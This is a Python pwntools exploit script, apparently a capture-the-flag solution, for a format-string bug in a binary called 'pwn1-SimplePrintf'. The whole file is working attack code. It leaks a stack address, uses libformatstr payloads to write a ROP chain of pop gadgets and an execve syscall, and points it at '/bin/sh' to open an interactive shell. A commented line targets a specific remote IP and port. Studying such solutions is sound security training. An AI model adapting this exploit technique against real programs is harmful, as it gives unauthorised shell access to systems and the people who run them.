from pwn import *
from libformatstr import FormatStr
import time

context.bits = 64
context.arch = 'amd64'
#context.log_level = 'debug'

prsi = 0x0000000000401837
prdi = 0x00000000004005d5
prdx = 0x0000000000442a76
prax_pp = 0x0000000000479836# : pop rax ; pop rdx ; pop rbx ; ret
leave = 0x0000000000400b68
ret = 0x00000000004002f6
syscall = 0x0000000000468205

f = FormatStr(isx64=1)
f[0x6cb020] = 0x400b6a
f[0x6cb000] = 0x12345678

r = process('./pwn1-SimplePrintf')
payload = '%pAAAAAA'+f.payload(7, start_len=20)+'/bin/sh\x00'
r.sendline(payload)
target = int(r.recv(14)[2:], 16)-0x93+0x1c8
bin_sh = target-0x108+0x48
log.info('target address: 0x%x' % target)
log.info('/bin/sh address: 0x%x' % bin_sh)
bin_sh_low = u64(p64(bin_sh)[0:4]+'\x00'*4)
bin_sh_high = u64(p64(bin_sh)[4:8]+'\x00'*4)

f = FormatStr(isx64=1)

f[target] = prax_pp
f[target+0x4] = 0
f[target+0x8] = 59 # rax
f[target+0xc] = 0
f[target+0x10] = 0 # rdx
f[target+0x14] = 0
f[target+0x18] = 0 # rbx
f[target+0x1c] = 0
f[target+0x20] = prsi
f[target+0x24] = 0
f[target+0x28] = 0 # rsi
f[target+0x2c] = 0

payload = f.payload(6, start_len=0)
r.sendline(payload)

f = FormatStr(isx64=1)
f[0x6cb020] = ret

f[target+0x30] = prdi
f[target+0x34] = 0
f[target+0x38] = bin_sh_low
f[target+0x3c] = bin_sh_high
f[target+0x40] = syscall
f[target+0x44] = 0
payload = f.payload(6, start_len=0)
raw_input('>>')
r.sendline(payload)
time.sleep(1)
r.recv(100000)
r.interactive()

#r = remote('106.75.66.195', 12001)

#raw_input('>>')
#r.sendline('%5$p%10$p')
